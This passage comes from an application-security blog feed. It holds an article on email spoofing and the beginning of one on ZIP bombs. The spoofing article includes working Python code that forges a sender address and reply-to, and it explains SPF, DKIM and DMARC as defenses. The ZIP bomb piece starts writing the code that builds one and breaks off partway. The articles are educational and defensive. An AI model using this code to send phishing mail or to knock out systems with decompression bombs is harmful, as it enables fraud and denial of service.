&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) üòá&lt;/li&gt;
&lt;li&gt;Part 9: &lt;a href="https://medium.com/faun/xxe-attacks-750e91448e8f"&gt;XXE attacks&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 10: &lt;a href="https://levelup.gitconnected.com/effective-access-control-331f883cb0ff"&gt;Effective Access Control&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 11: &lt;a href="https://medium.com/bugbountywriteup/dos-via-a-billion-laughs-9a79be96e139"&gt;DOS via a Billion Laughs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 12: &lt;a href="https://medium.com/faun/full-disk-encryption-2090489f9760"&gt;Full Disk Encryption&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 13: &lt;a href="https://medium.com/bugbountywriteup/insecure-deserialization-5c64e9943f0e"&gt;Insecure Deserialization&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 14: &lt;a href="https://levelup.gitconnected.com/docker-security-5f4df118948c"&gt;Docker Security&lt;/a&gt; üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And this is about to come:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CSRF üòà&lt;/li&gt;
&lt;li&gt;DOS üòà&lt;/li&gt;
&lt;li&gt;ReDoS üòà&lt;/li&gt;
&lt;li&gt;Credential Stuffing üòà&lt;/li&gt;
&lt;li&gt;Cryptojacking üòà&lt;/li&gt;
&lt;li&gt;Single-Sign-On üòá&lt;/li&gt;
&lt;li&gt;Two-Factor Authentication üòá&lt;/li&gt;
&lt;li&gt;Backups üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="Security"></category><category term="Cybersecurity"></category><category term="InfoSec"></category><category term="SCA"></category></entry><entry><title>Email Spoofing üòà</title><link href="https://martin-thoma.com/https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf" rel="alternate"></link><published>2020-12-02T20:00:00+01:00</published><updated>2020-12-02T20:00:00+01:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-12-02:/https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf</id><summary type="html">&lt;p&gt;Email spoofing is the creation of emails with a forged sender address. Faking the senders&amp;rsquo; address is often a part of a &lt;strong&gt;phishing&lt;/strong&gt; attack. There are different ways to fool the victim of a phishing attack about who is the real sender: Using slightly different sender domains like security@paypal ‚Ä¶&lt;/p&gt;</summary><content type="html">&lt;p&gt;Email spoofing is the creation of emails with a forged sender address. Faking the senders&amp;rsquo; address is often a part of a &lt;strong&gt;phishing&lt;/strong&gt; attack. There are different ways to fool the victim of a phishing attack about who is the real sender: Using slightly different sender domains like security@paypal.co instead of security@paypal.com , hiding the senders address like in Paypal Security &lt;a href="mailto:something@phishy.com"&gt;something@phishy.com&lt;/a&gt; , or spoofing the email address.&lt;/p&gt;
&lt;h2 id="why-it-matters"&gt;Why it Matters&lt;/h2&gt;
&lt;p&gt;Business Email Compromise (BEC) is a form of fraud that uses a business email address. There are many examples of this, but they are not well documented. At least not publicly. Some of the bigger ones I&amp;rsquo;ve found are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;2014&lt;/strong&gt;: The drug company Upsher-Smith Laboratories lost &lt;strong&gt;$50 million USD&lt;/strong&gt; by CEO fraud (&lt;a href="https://www.fox9.com/news/ceo-spoofing-costs-drug-company-50-million"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2015&lt;/strong&gt;: The networking company Ubiquiti Networks lost &lt;strong&gt;$46.7 million USD&lt;/strong&gt; to a scammer who impersonated employees (&lt;a href="https://www.nbcnews.com/tech/security/ubiquiti-networks-says-it-was-victim-47-million-cyber-scam-n406201"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&amp;ldquo;In &lt;strong&gt;2018&lt;/strong&gt;, the IC3 received 20,373 BEC/E-mail Account Compromise (EAC) complaints with adjusted losses of over &lt;strong&gt;$1.2 billion&lt;/strong&gt;&amp;rdquo; (&lt;a href="https://www.ic3.gov/Media/PDF/AnnualReport/2018_IC3Report.pdf"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="how-are-emails-spoofed"&gt;How are Emails spoofed?&lt;/h2&gt;
&lt;p&gt;Emails are transferred via the &lt;a href="https://de.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol"&gt;SMTP&lt;/a&gt; protocol. This protocol has an envelope that contains the sender (&lt;strong&gt;MAIL FROM&lt;/strong&gt;) and the recipient (&lt;strong&gt;RCPT TO&lt;/strong&gt;). The sender is typically not verified and not displayed. Instead, the content of the mail contains additional metadata. One item there is the &lt;strong&gt;reply-to&lt;/strong&gt; and the &lt;strong&gt;sender&lt;/strong&gt;. It&amp;rsquo;s interesting that reply-to and sender are different.&lt;/p&gt;
&lt;p&gt;As an attacker, one can manipulate everything. Just like with normal mail:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Write a wrong MAIL FROM&lt;/li&gt;
&lt;li&gt;Claim within the mail you&amp;rsquo;re another person (sender)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A key difference here is that typically, a lot is handled in the background.&lt;/p&gt;
&lt;p&gt;To make it clear that this is super easy and the attackers are not doing rocket science, here is how an email can be sent with Python:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;smtplib&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;email.message&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;EmailMessage&lt;/span&gt;

&lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;EmailMessage&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_content&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"You've been a good boy"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"Subject"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"Ho-ho-ho"&lt;/span&gt;
&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;
    &lt;span class="s2"&gt;"From"&lt;/span&gt;
&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"[santa.clause@christm.as](mailto:santa.clause@christm.as)"&lt;/span&gt;  &lt;span class="c1"&gt;# The fake sender&lt;/span&gt;
&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"To"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"victim@example.com"&lt;/span&gt;  &lt;span class="c1"&gt;# The actual receiver&lt;/span&gt;
&lt;span class="c1"&gt;# msg.add_header("reply-to", "[phishy@phising.com](mailto:phishy@phising.com)")  # The attackers address&lt;/span&gt;

&lt;span class="c1"&gt;# Send the message via our own SMTP server.&lt;/span&gt;
&lt;span class="c1"&gt;# On Ubuntu, you need to install sendmail:&lt;/span&gt;
&lt;span class="c1"&gt;#     $ apt-get install sendmail&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;smtplib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SMTP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"localhost"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send_message&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;quit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Which then looks like this in Gmail:&lt;/p&gt;
&lt;figure class="wp-caption aligncenter img-thumbnail"&gt;
&lt;a href="../images/2020/12/email-spoofing-gmail-1.png"&gt;&lt;img alt="Spoofed Email in Gmail" src="../images/2020/12/email-spoofing-gmail-1.png" style="width: 512px;"/&gt;&lt;/a&gt;
&lt;figcaption class="text-center"&gt;Spoofed Email in Gmail&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;When I click on it, I see this:&lt;/p&gt;
&lt;figure class="wp-caption aligncenter img-thumbnail"&gt;
&lt;a href="../images/2020/12/email-spoofing-gmail-1-full.png"&gt;&lt;img alt="Spoofed Email in Gmail - full view" src="../images/2020/12/email-spoofing-gmail-1-full.png" style="width: 512px;"/&gt;&lt;/a&gt;
&lt;figcaption class="text-center"&gt;Spoofed Email in Gmail - full view&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;Even when I go on the details, I see:&lt;/p&gt;
&lt;figure class="wp-caption aligncenter img-thumbnail"&gt;
&lt;a href="../images/2020/12/gmail-show-original.png"&gt;&lt;img alt="'Show original' in Gmail" src="../images/2020/12/gmail-show-original.png" style="width: 512px;"/&gt;&lt;/a&gt;
&lt;figcaption class="text-center"&gt;'Show original' in Gmail&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;figure class="wp-caption aligncenter img-thumbnail"&gt;
&lt;a href="../images/2020/12/gmail-original-mail.png"&gt;&lt;img alt="Original view of email" src="../images/2020/12/gmail-original-mail.png" style="width: 512px;"/&gt;&lt;/a&gt;
&lt;figcaption class="text-center"&gt;Original view of email&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;The attacker might also put a reply-to in the mail:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"reply-to"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;"phishy@phising.com"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The attacker can also add a name to the email address:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;email.utils&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;formataddr&lt;/span&gt;

&lt;span class="n"&gt;fake_address&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"santa.clause@christm.as"&lt;/span&gt;
&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"From"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;formataddr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s2"&gt;"Santa Clause"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fake_address&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Interestingly, that triggered Gmails spam detection:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Screenshot taken by Martin Thoma" src="https://cdn-images-1.medium.com/max/2976/1*Z6XyVCcysdDbLdMlhEkaxw.png"/&gt;&lt;em&gt;Screenshot taken by Martin Thoma&lt;/em&gt;&lt;/p&gt;
&lt;h2 id="how-can-i-prevent-email-spoofing"&gt;How can I prevent Email Spoofing?&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Sender_Policy_Framework"&gt;&lt;strong&gt;SPF&lt;/strong&gt;&lt;/a&gt; (Sender
  Policy Framework), is an email authentication method designed to detect
  forging sender addresses in emails. Domain owners (e.g. me for
  martin-thoma.com) can publish SPF records to DNS. In that record, they
  &lt;strong&gt;whitelist IP addresses&lt;/strong&gt; that can send emails for their domain. Email
  servers can then perform an SPF lookup when they receive an email for the
  (claimed) sender's domain. That prevents spammers from using your domains
  &lt;strong&gt;in the email envelope&lt;/strong&gt;. When spammers do, the receiving email server
  &lt;strong&gt;can&lt;/strong&gt; check the SPF record and either reject the email completely or mark
  it as spam. More information can be found at
  &lt;a href="http://www.open-spf.org/SPF_Record_Syntax/"&gt;open-spf.org&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/DomainKeys_Identified_Mail"&gt;&lt;strong&gt;DKIM&lt;/strong&gt;&lt;/a&gt;
  (DomainKeys Identified Mail), is an email authentication method designed to
  detect forged sender addresses in emails. It works by &lt;strong&gt;cryptographically
  signing sent emails&lt;/strong&gt; from a given domain. This is not a signature per
  person, but a signature for your organization. The corresponding public key
  is published to the DNS records where email servers that receive those mails
  can get it and verify it. DKIM makes sure that nobody tampered with the email
  after it was sent. Imagine DKIM like a seal. SPF then is the knowledge which
  seal should be used.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/DMARC"&gt;&lt;strong&gt;DMARC&lt;/strong&gt;&lt;/a&gt; (Domain-based Message
  Authentication, Reporting, and Conformance), is an email authentication
  protocol. DMARC uses SPF and DKIM and gives &lt;strong&gt;policies&lt;/strong&gt; on how to deal with
  error cases. The domain owner creates a DMARC DNS record that contains
  instructions on what to do with messages that failed the SPF / DKIM test.
  Received emails that failed can on the receiver side either be rejected or
  quarantined. If that happens, DMARC can be configured to send a report back.
  DMARC enforces an &lt;strong&gt;alignment&lt;/strong&gt; of the MAIL FROM and the sender. This can be
  problematic for newsletters but represents also what users expect.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;As a domain owner, you can validate your SPF record like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;dig&lt;span class="w"&gt; &lt;/span&gt;google.com&lt;span class="w"&gt; &lt;/span&gt;txt&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;grep&lt;span class="w"&gt; &lt;/span&gt;spf
google.com.&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="m"&gt;3600&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;IN&lt;span class="w"&gt; &lt;/span&gt;TXT&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"v=spf1 include:_spf.google.com ~all"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;To verify DKIM, look in an email you received for this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=medium.com; \
h=content-type:from:mime-version:reply-to:to:subject:list-unsubscribe; \
s=m1; bh=NY62YFtbfuXkL/SNoiClZV8gaZxkiYhFD4J77gUHGEY=; \
b=EL3HbaL iSgAJsE6LO8L10T52+rYyump4R1aMAV9nCwyXLENaxbS0xgZvksgoplu8Rjo/wWV J0jDEFRe+UsOnIhaCTBXa1H7LVdjkRyOu9+9Qwd7hlWY5fx/mtRQXvWRDfe9KEsS 9WH8o0lRbOAq7AJXPLID/tZokm+KIMmMc/H0=
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The record is structured in tag=version pairs which are separated by &lt;code&gt;;&lt;/code&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;v&lt;/code&gt;: DKIM &lt;strong&gt;version&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;a&lt;/code&gt;: The signature &lt;strong&gt;algorithm&lt;/strong&gt;, typically rsa-sha256&lt;/li&gt;
&lt;li&gt;&lt;code&gt;c&lt;/code&gt;: The &lt;strong&gt;canonicalization&lt;/strong&gt; algorithm. The first value is for the header, the second one for the body of the email.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;d&lt;/code&gt;: The used &lt;strong&gt;domain&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;h&lt;/code&gt;: The &lt;strong&gt;headers&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s&lt;/code&gt;: The DKIM &lt;strong&gt;selector&lt;/strong&gt; record name.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;b&lt;/code&gt;: The base64 encoded hash value of the headers h .&lt;/li&gt;
&lt;li&gt;&lt;code&gt;bh&lt;/code&gt;: The hash of the body of the email.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can look up your DMARC record like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;dig&lt;span class="w"&gt; &lt;/span&gt;_dmarc.google.com&lt;span class="w"&gt; &lt;/span&gt;txt&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;grep&lt;span class="w"&gt; &lt;/span&gt;DMARC
_dmarc.google.com.&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;290&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;IN&lt;span class="w"&gt; &lt;/span&gt;TXT&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"v=DMARC1; p=reject; \&lt;/span&gt;
&lt;span class="s2"&gt;    rua=[mailauth-reports@google.com](mailto:mailauth-reports@google.com)"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The record is structured in tag=value pairs which are separated by &lt;code&gt;;&lt;/code&gt; (&lt;a href="https://dmarc.org/overview/"&gt;source&lt;/a&gt;):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;v&lt;/code&gt;: The protocol &lt;strong&gt;version.&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;p&lt;/code&gt;: The &lt;strong&gt;policy&lt;/strong&gt;. It typically should be reject , but can also be quarantine&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rua&lt;/code&gt;: The reporting URI for &lt;strong&gt;aggregate reports&lt;/strong&gt; (how the domain is used)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ruf&lt;/code&gt;: The reporting URI for &lt;strong&gt;forensic reports&lt;/strong&gt;
 (showing when validation failed)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pct&lt;/code&gt;: How many percent of mails get handled with DMARC. You can set this to an integer from 0 to 100. For the beginning, you can set it low for testing. It should become 100 over time. If you don&amp;rsquo;t use the tag at all, it&amp;rsquo;s by default 100%.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="summary"&gt;Summary&lt;/h2&gt;
&lt;p&gt;Spoofing emails is easy.&lt;/p&gt;
&lt;p&gt;As a system administrator, you can protect your company by setting an &lt;a href="https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/set-up-anti-phishing-policies?view=o365-worldwide"&gt;anti-phishing-policy in Office 365&lt;/a&gt; or review the &lt;a href="https://support.google.com/a/answer/9157861?hl=en"&gt;advanced phishing and malware settings of G Suite&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;As a domain owner, make sure you have SPF, DKIM, and DMARC configured correctly to protect your customers or clients.&lt;/p&gt;
&lt;h2 id="whats-next"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers üòà and also techniques of the defenders üòá:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) üòá&lt;/li&gt;
&lt;li&gt;Part 9: &lt;a href="https://medium.com/faun/xxe-attacks-750e91448e8f"&gt;XXE attacks&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 10: &lt;a href="https://levelup.gitconnected.com/effective-access-control-331f883cb0ff"&gt;Effective Access Control&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 11: &lt;a href="https://medium.com/bugbountywriteup/dos-via-a-billion-laughs-9a79be96e139"&gt;DOS via a Billion Laughs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 12: &lt;a href="https://medium.com/faun/full-disk-encryption-2090489f9760"&gt;Full Disk Encryption&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 13: &lt;a href="https://medium.com/bugbountywriteup/insecure-deserialization-5c64e9943f0e"&gt;Insecure Deserialization&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 14: &lt;a href="https://levelup.gitconnected.com/docker-security-5f4df118948c"&gt;Docker Security&lt;/a&gt; üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And this is about to come:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CSRF üòà&lt;/li&gt;
&lt;li&gt;DOS üòà&lt;/li&gt;
&lt;li&gt;ReDoS üòà&lt;/li&gt;
&lt;li&gt;Credential Stuffing üòà&lt;/li&gt;
&lt;li&gt;Cryptojacking üòà&lt;/li&gt;
&lt;li&gt;Single-Sign-On üòá&lt;/li&gt;
&lt;li&gt;Two-Factor Authentication üòá&lt;/li&gt;
&lt;li&gt;Backups üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="Security"></category><category term="email"></category><category term="InfoSec"></category><category term="CyberSecurity"></category></entry><entry><title>ZIP Bombs üí£üòà</title><link href="https://martin-thoma.com/https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112" rel="alternate"></link><published>2020-10-28T20:00:00+01:00</published><updated>2020-10-28T20:00:00+01:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-10-28:/https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112</id><summary type="html">&lt;p&gt;A &lt;a href="https://en.wikipedia.org/wiki/Zip_bomb"&gt;zip bomb&lt;/a&gt; is a zip file that is designed to take an enormous amount of space once it is unpacked. The best-known one is called 42.zip and has a size of &lt;strong&gt;42kB&lt;/strong&gt;. It contains recursively nested zip-files. On the lowest level, there is a single file which decompresses ‚Ä¶&lt;/p&gt;</summary><content type="html">&lt;p&gt;A &lt;a href="https://en.wikipedia.org/wiki/Zip_bomb"&gt;zip bomb&lt;/a&gt; is a zip file that is designed to take an enormous amount of space once it is unpacked. The best-known one is called 42.zip and has a size of &lt;strong&gt;42kB&lt;/strong&gt;. It contains recursively nested zip-files. On the lowest level, there is a single file which decompresses to a size of 4.3GB . This file is added in total over a million times to the archive, leading to a total unpacked size of &lt;strong&gt;4.5PB&lt;/strong&gt; . This is well over the size of any available storage system.&lt;/p&gt;
&lt;blockquote&gt;
&lt;h1 id="zip-bombs-are-a-form-of-decompression-bomb-decompression-bombs-are-compressed-files-which-extract-to-a-crazy-file-size-decompression-bombs-are-a-form-of-denial-of-service-attacks"&gt;Zip bombs are a form of decompression bomb. Decompression bombs are compressed files which extract to a crazy file size. Decompression bombs are a form of denial-of-service attacks.&lt;/h1&gt;
&lt;/blockquote&gt;
&lt;p&gt;Unpacking such an archive can lead in various systems to problems which are all connected to running either out of memory or out of disk space. For example, an anti-virus scanner might unpack the ZIP file and thus get killed due to memory exhaustion. A backend server might fill up its disk and no longer be able to operate.&lt;/p&gt;
&lt;h2 id="how-to-create-a-zip-bomb"&gt;How to create a ZIP bomb&lt;/h2&gt;
&lt;p&gt;The simplest ZIP bombs are super easy to create. You can simply use the packages found within Python:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;tempfile&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;mkstemp&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;zipfile&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ZIP_LZMA&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ZipFile&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;create_txt_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;size_in_byte&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;handle&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;filepath&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mkstemp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;suffix&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;".txt"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;prefix&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"zip-txt-"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;handle&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filepath&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;"w"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"0"&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;size_in_byte&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
